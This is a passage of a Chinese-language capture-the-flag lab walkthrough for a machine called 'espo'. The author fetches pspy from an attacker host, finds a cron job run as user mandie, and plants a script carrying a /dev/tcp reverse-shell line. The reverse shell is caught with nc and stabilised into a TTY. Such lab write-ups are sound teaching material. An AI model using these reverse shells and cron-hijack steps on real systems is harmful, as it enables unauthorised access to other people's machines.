+directory_mappings=( [<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$PICTURES_DIR</span><span class="pl-pds">"</span></span>]=<span class="pl-s"><span class="pl-pds">"</span>jpeg jpg<span class="pl-pds">"</span></span> [<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$VIDEOS_DIR</span><span class="pl-pds">"</span></span>]=<span class="pl-s"><span class="pl-pds">"</span>mp4 avi<span class="pl-pds">"</span></span> )
+
+<span class="pl-k">for</span> <span class="pl-smi">dir</span> <span class="pl-k">in</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">${<span class="pl-k">!</span>directory_mappings[@]}</span><span class="pl-pds">"</span></span><span class="pl-k">;</span> <span class="pl-k">do</span>
+    <span class="pl-k">for</span> <span class="pl-smi">ext</span> <span class="pl-k">in</span> <span class="pl-smi">${directory_mappings[$dir]}</span><span class="pl-k">;</span> <span class="pl-k">do</span>
+        mv <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$HOME</span><span class="pl-pds">"</span></span>/<span class="pl-k">*</span>.<span class="pl-smi">$ext</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$dir</span>/<span class="pl-pds">"</span></span> <span class="pl-k">2&gt;</span>/dev/null
+    <span class="pl-k">done</span>
+<span class="pl-k">done</span>
+www-data@espo:/home/mandie$ <span class="pl-c1">cd</span> /tmp/
+www-data@espo:/tmp$ wget 192.168.205.141/pspy
+--2025-01-08 06:56:53--  http://192.168.205.141/pspy
+Connecting to 192.168.205.141:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3518724 (3.4M) [application/octet-stream]
+Saving to: <span class="pl-s"><span class="pl-pds">'</span>pspy<span class="pl-pds">'</span></span>
+
+pspy                                                         0%[                                                                       pspy                                                       100%[<span class="pl-k">========================================================================================================================================&gt;</span>]   3.36M  --.-KB/s    <span class="pl-k">in</span> 0.02s   
+
+2025-01-08 06:56:53 (172 MB/s) - <span class="pl-s"><span class="pl-pds">'</span>pspy<span class="pl-pds">'</span></span> saved [3518724/3518724]
+
+www-data@espo:/tmp$ chmod +x pspy 
+www-data@espo:/tmp$ ./pspy 
+pspy - version: 1.2.1 - Commit SHA: kali
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░   
+                               ░ ░   
+
+Config: Printing events (colored=true): processes<span class="pl-k">=</span>true <span class="pl-k">|</span> file-system-events<span class="pl-k">=</span>false <span class="pl-k">||</span><span class="pl-k">|</span> Scanning <span class="pl-k">for</span> processes every 100ms and on inotify events <span class="pl-k">||</span><span class="pl-k">|</span> Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) <span class="pl-k">|</span> [] (non-recursive)
+Draining file system events due to startup...
+<span class="pl-k">done</span>
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>33    PID<span class="pl-k">=</span>2064   <span class="pl-k">|</span> ./pspy 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>2048   <span class="pl-k">|</span> /usr/bin/php <span class="pl-k">-f</span> cron.php 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>2047   <span class="pl-k">|</span> /bin/sh <span class="pl-k">-c</span> <span class="pl-c1">cd</span> /var/www/html<span class="pl-k">;</span> /usr/bin/php <span class="pl-k">-f</span> cron.php <span class="pl-k">&gt;</span> /dev/null <span class="pl-k">2&gt;&amp;1</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>2044   <span class="pl-k">|</span> /usr/sbin/CRON <span class="pl-k">-f</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>33    PID<span class="pl-k">=</span>2015   <span class="pl-k">|</span> bash 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>33    PID<span class="pl-k">=</span>2014   <span class="pl-k">|</span> sh <span class="pl-k">-c</span> bash 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>33    PID<span class="pl-k">=</span>2013   <span class="pl-k">|</span> script /dev/null <span class="pl-k">-c</span> bash 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>2011   <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>33    PID<span class="pl-k">=</span>1990   <span class="pl-k">|</span> bash -i 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>33    PID<span class="pl-k">=</span>1989   <span class="pl-k">|</span> bash <span class="pl-k">-c</span> bash -i <span class="pl-k">&gt;</span><span class="pl-k">&amp;</span> /dev/tcp/192.168.205.141/8888 <span class="pl-k">0&gt;&amp;1</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>33    PID<span class="pl-k">=</span>1988   <span class="pl-k">|</span> sh <span class="pl-k">-c</span> bash <span class="pl-k">-c</span> <span class="pl-s"><span class="pl-pds">"</span>bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1<span class="pl-pds">"</span></span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>1935   <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>1873   <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>1808   <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>1595   <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>1273   <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>33    PID<span class="pl-k">=</span>1111   <span class="pl-k">|</span> php-fpm: pool www                                                           
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>109   PID<span class="pl-k">=</span>1042   <span class="pl-k">|</span> qmgr -l <span class="pl-k">-t</span> unix <span class="pl-k">-u</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>109   PID<span class="pl-k">=</span>1041   <span class="pl-k">|</span> pickup -l <span class="pl-k">-t</span> unix <span class="pl-k">-u</span> <span class="pl-k">-c</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>1039   <span class="pl-k">|</span> /usr/lib/postfix/sbin/master <span class="pl-k">-w</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>108   PID<span class="pl-k">=</span>673    <span class="pl-k">|</span> /usr/sbin/mariadbd 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>629    <span class="pl-k">|</span> sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>33    PID<span class="pl-k">=</span>609    <span class="pl-k">|</span> php-fpm: pool www                                                           
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>33    PID<span class="pl-k">=</span>608    <span class="pl-k">|</span> php-fpm: pool www                                                           
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>33    PID<span class="pl-k">=</span>544    <span class="pl-k">|</span> nginx: worker process                          
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>540    <span class="pl-k">|</span> nginx: master process /usr/sbin/nginx <span class="pl-k">-g</span> daemon on<span class="pl-k">;</span> master_process on<span class="pl-k">;</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>531    <span class="pl-k">|</span> /sbin/agetty <span class="pl-k">-o</span> <span class="pl-k">-p</span> -- <span class="pl-cce">\u</span> --noclear - linux 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>509    <span class="pl-k">|</span> php-fpm: master process (/etc/php/8.2/fpm/php-fpm.conf)                     
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>489    <span class="pl-k">|</span> /usr/sbin/ModemManager 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>461    <span class="pl-k">|</span> /sbin/wpa_supplicant <span class="pl-k">-u</span> <span class="pl-k">-s</span> <span class="pl-k">-O</span> DIR<span class="pl-k">=</span>/run/wpa_supplicant GROUP<span class="pl-k">=</span>netdev 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>432    <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>421    <span class="pl-k">|</span> /lib/systemd/systemd-logind 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>996   PID<span class="pl-k">=</span>414    <span class="pl-k">|</span> /usr/lib/polkit-1/polkitd --no-debug 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>100   PID<span class="pl-k">=</span>411    <span class="pl-k">|</span> /usr/bin/dbus-daemon --system --address<span class="pl-k">=</span>systemd: --nofork --nopidfile --systemd-activation --syslog-only                                                                                                                    
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>410    <span class="pl-k">|</span> /usr/sbin/cron <span class="pl-k">-f</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>389    <span class="pl-k">|</span> dhclient -4 -v -i <span class="pl-k">-p</span>f /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I <span class="pl-k">-d</span>f /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                                                                 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>303    <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>997   PID<span class="pl-k">=</span>284    <span class="pl-k">|</span> /lib/systemd/systemd-timesyncd 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>242    <span class="pl-k">|</span> /lib/systemd/systemd-udevd 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>218    <span class="pl-k">|</span> /lib/systemd/systemd-journald 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>174    <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>173    <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>141    <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>134    <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>133    <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>132    <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>131    <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>130    <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>129    <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>126    <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>59     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>58     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>53     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>48     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>47     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>46     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>44     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>38     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>37     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>36     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>35     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>34     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>33     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>32     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>31     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>30     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>29     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>28     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>27     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>24     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>23     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>22     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>21     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>20     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>18     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>16     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>15     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>14     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>13     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>12     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>11     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>10     <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>6      <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>5      <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>4      <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>3      <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>2      <span class="pl-k">|</span> 
+2025/01/08 06:57:08 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>1      <span class="pl-k">|</span> /sbin/init 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>2072   <span class="pl-k">|</span> /usr/sbin/CRON <span class="pl-k">-f</span> 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>2071   <span class="pl-k">|</span> /usr/sbin/cron <span class="pl-k">-f</span> 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>2073   <span class="pl-k">|</span> /usr/sbin/CRON <span class="pl-k">-f</span> 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>2075   <span class="pl-k">|</span> /usr/sbin/CRON <span class="pl-k">-f</span> 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>0     PID<span class="pl-k">=</span>2077   <span class="pl-k">|</span> /bin/sh <span class="pl-k">-c</span> <span class="pl-c1">cd</span> /var/www/html<span class="pl-k">;</span> /usr/bin/php <span class="pl-k">-f</span> cron.php <span class="pl-k">&gt;</span> /dev/null <span class="pl-k">2&gt;&amp;1</span> 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>1000  PID<span class="pl-k">=</span>2076   <span class="pl-k">|</span> /bin/sh <span class="pl-k">-c</span> /home/mandie/copyPics 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>1000  PID<span class="pl-k">=</span>2078   <span class="pl-k">|</span> /bin/bash /home/mandie/copyPics 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>1000  PID<span class="pl-k">=</span>2079   <span class="pl-k">|</span> /usr/bin/find /var/shared_medias <span class="pl-k">!</span> <span class="pl-k">-e</span>xecutable <span class="pl-k">-e</span>xec /usr/bin/cp {} /home/mandie <span class="pl-k">;</span> 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>1000  PID<span class="pl-k">=</span>2080   <span class="pl-k">|</span> /usr/bin/find /var/shared_medias <span class="pl-k">!</span> <span class="pl-k">-e</span>xecutable <span class="pl-k">-e</span>xec /usr/bin/cp {} /home/mandie <span class="pl-k">;</span> 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>1000  PID<span class="pl-k">=</span>2081   <span class="pl-k">|</span> /usr/bin/find /var/shared_medias <span class="pl-k">!</span> <span class="pl-k">-e</span>xecutable <span class="pl-k">-e</span>xec /usr/bin/cp {} /home/mandie <span class="pl-k">;</span> 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>1000  PID<span class="pl-k">=</span>2082   <span class="pl-k">|</span> /usr/bin/find /var/shared_medias <span class="pl-k">!</span> <span class="pl-k">-e</span>xecutable <span class="pl-k">-e</span>xec /usr/bin/cp {} /home/mandie <span class="pl-k">;</span> 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>1000  PID<span class="pl-k">=</span>2083   <span class="pl-k">|</span> /usr/bin/find /var/shared_medias <span class="pl-k">!</span> <span class="pl-k">-e</span>xecutable <span class="pl-k">-e</span>xec /usr/bin/cp {} /home/mandie <span class="pl-k">;</span> 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>1000  PID<span class="pl-k">=</span>2084   <span class="pl-k">|</span> /usr/bin/find /var/shared_medias <span class="pl-k">!</span> <span class="pl-k">-e</span>xecutable <span class="pl-k">-e</span>xec /usr/bin/cp {} /home/mandie <span class="pl-k">;</span> 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>1000  PID<span class="pl-k">=</span>2085   <span class="pl-k">|</span> /usr/bin/find /var/shared_medias <span class="pl-k">!</span> <span class="pl-k">-e</span>xecutable <span class="pl-k">-e</span>xec /usr/bin/cp {} /home/mandie <span class="pl-k">;</span> 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>1000  PID<span class="pl-k">=</span>2086   <span class="pl-k">|</span> /bin/bash /home/mandie/copyPics 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>1000  PID<span class="pl-k">=</span>2087   <span class="pl-k">|</span> /bin/bash /home/mandie/copyPics 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>1000  PID<span class="pl-k">=</span>2088   <span class="pl-k">|</span> /bin/bash /home/mandie/copyPics 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>1000  PID<span class="pl-k">=</span>2089   <span class="pl-k">|</span> /bin/bash /home/mandie/copyPics 
+2025/01/08 06:58:01 CMD: UID<span class="pl-k">=</span>1000  PID<span class="pl-k">=</span>2090   <span class="pl-k">|</span> /bin/bash /home/mandie/copyPics 
+^CExiting program... (interrupt)
+</pre></div>
+<p>有定时任务用<code class="notranslate">UID1000</code>的用户执行<code class="notranslate">/home/mandie/copyPics</code>，<code class="notranslate">copyPics</code>的内容</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@espo:/home/mandie$ cat copyPics 
+<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+
+SOURCE_MEDIAS=<span class="pl-s"><span class="pl-pds">"</span>/var/shared_medias<span class="pl-pds">"</span></span>
+PICTURES_DIR=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$HOME</span>/pictures<span class="pl-pds">"</span></span>
+VIDEOS_DIR=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$HOME</span>/videos<span class="pl-pds">"</span></span>
+
+/usr/bin/find <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$SOURCE_MEDIAS</span><span class="pl-pds">"</span></span> <span class="pl-k">!</span> -executable -exec /usr/bin/cp {} <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$HOME</span><span class="pl-pds">"</span></span> <span class="pl-k">2&gt;</span>/dev/null <span class="pl-cce">\;</span>
+mkdir -p <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$PICTURES_DIR</span><span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$VIDEOS_DIR</span><span class="pl-pds">"</span></span>
+
+<span class="pl-k">declare</span> -A directory_mappings
+directory_mappings=( [<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$PICTURES_DIR</span><span class="pl-pds">"</span></span>]=<span class="pl-s"><span class="pl-pds">"</span>jpeg jpg<span class="pl-pds">"</span></span> [<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$VIDEOS_DIR</span><span class="pl-pds">"</span></span>]=<span class="pl-s"><span class="pl-pds">"</span>mp4 avi<span class="pl-pds">"</span></span> )
+
+<span class="pl-k">for</span> <span class="pl-smi">dir</span> <span class="pl-k">in</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">${<span class="pl-k">!</span>directory_mappings[@]}</span><span class="pl-pds">"</span></span><span class="pl-k">;</span> <span class="pl-k">do</span>
+    <span class="pl-k">for</span> <span class="pl-smi">ext</span> <span class="pl-k">in</span> <span class="pl-smi">${directory_mappings[$dir]}</span><span class="pl-k">;</span> <span class="pl-k">do</span>
+        mv <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$HOME</span><span class="pl-pds">"</span></span>/<span class="pl-k">*</span>.<span class="pl-smi">$ext</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$dir</span>/<span class="pl-pds">"</span></span> <span class="pl-k">2&gt;</span>/dev/null
+    <span class="pl-k">done</span>
+<span class="pl-k">done</span></pre></div>
+<p>实现了从一个目录 <code class="notranslate">/var/shared_medias</code> 中筛选不可执行文件，并把文件复制到用户的家目录下。那我们可以尝试在<code class="notranslate">/var/shared_medias</code>中创建一个<code class="notranslate">copyPics</code>文件，并在里面加点料</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@espo:/tmp$ ls -la /var/shared_medias
+total 7792
+drwxrwxrwt  2 root root    4096 Jan 24  2024 <span class="pl-c1">.</span>
+drwxr-xr-x 13 root root    4096 Dec  7  2023 ..
+-rw-r--r--  1 root root   61521 Dec  4  2023 bedroom.jpg
+-rw-r--r--  1 root root  298808 Dec  4  2023 burger.jpeg
+-rw-r--r--  1 root root  236712 Dec  4  2023 dad-baby.jpg
+-rw-r--r--  1 root root   61324 Dec  4  2023 dorothy.jpeg
+-rw-r--r--  1 root root  268188 Dec  4  2023 family.jpg
+-rw-r--r--  1 root root  251902 Dec  4  2023 maldives.jpg
+-rw-r--r--  1 root root 6779935 Dec  4  2023 sky.mp4
+www-data@espo:/tmp$ <span class="pl-c1">cd</span> /var/shared_medias
+www-data@espo:/var/shared_medias$ cp /home/mandie/copyPics <span class="pl-c1">.</span>
+www-data@espo:/var/shared_medias$ nano copyPics 
+www-data@espo:/var/shared_medias$ cat copyPics 
+<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+
+SOURCE_MEDIAS=<span class="pl-s"><span class="pl-pds">"</span>/var/shared_medias<span class="pl-pds">"</span></span>
+PICTURES_DIR=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$HOME</span>/pictures<span class="pl-pds">"</span></span>
+VIDEOS_DIR=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$HOME</span>/videos<span class="pl-pds">"</span></span>
+
+/usr/bin/find <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$SOURCE_MEDIAS</span><span class="pl-pds">"</span></span> <span class="pl-k">!</span> -executable -exec /usr/bin/cp {} <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$HOME</span><span class="pl-pds">"</span></span> <span class="pl-k">2&gt;</span>/dev/null <span class="pl-cce">\;</span>
+mkdir -p <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$PICTURES_DIR</span><span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$VIDEOS_DIR</span><span class="pl-pds">"</span></span>
+
+<span class="pl-k">declare</span> -A directory_mappings
+directory_mappings=( [<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$PICTURES_DIR</span><span class="pl-pds">"</span></span>]=<span class="pl-s"><span class="pl-pds">"</span>jpeg jpg<span class="pl-pds">"</span></span> [<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$VIDEOS_DIR</span><span class="pl-pds">"</span></span>]=<span class="pl-s"><span class="pl-pds">"</span>mp4 avi<span class="pl-pds">"</span></span> )
+
+<span class="pl-k">for</span> <span class="pl-smi">dir</span> <span class="pl-k">in</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">${<span class="pl-k">!</span>directory_mappings[@]}</span><span class="pl-pds">"</span></span><span class="pl-k">;</span> <span class="pl-k">do</span>
+    <span class="pl-k">for</span> <span class="pl-smi">ext</span> <span class="pl-k">in</span> <span class="pl-smi">${directory_mappings[$dir]}</span><span class="pl-k">;</span> <span class="pl-k">do</span>
+        mv <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$HOME</span><span class="pl-pds">"</span></span>/<span class="pl-k">*</span>.<span class="pl-smi">$ext</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$dir</span>/<span class="pl-pds">"</span></span> <span class="pl-k">2&gt;</span>/dev/null
+    <span class="pl-k">done</span>
+<span class="pl-k">done</span>
+
+
+bash -c <span class="pl-s"><span class="pl-pds">"</span>bash -i &gt;&amp; /dev/tcp/192.168.205.141/9999 0&gt;&amp;1<span class="pl-pds">"</span></span></pre></div>
+<p>让子弹飞会</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 9999
+listening on [any] 9999 ...
+id
+connect to [192.168.205.141] from (UNKNOWN) [192.168.205.236] 43262
+bash: cannot <span class="pl-c1">set</span> terminal process group (2562): Inappropriate ioctl <span class="pl-k">for</span> device
+bash: no job control <span class="pl-k">in</span> this shell
+mandie@espo:<span class="pl-k">~</span>$ id
+uid=1000(mandie) gid=1000(mandie) groups=1000(mandie),100(users)
+</pre></div>
+<p>获得一下稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash  
+ctrl+z  
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
+reset xterm  
+<span class="pl-k">export</span> TERM=xterm  
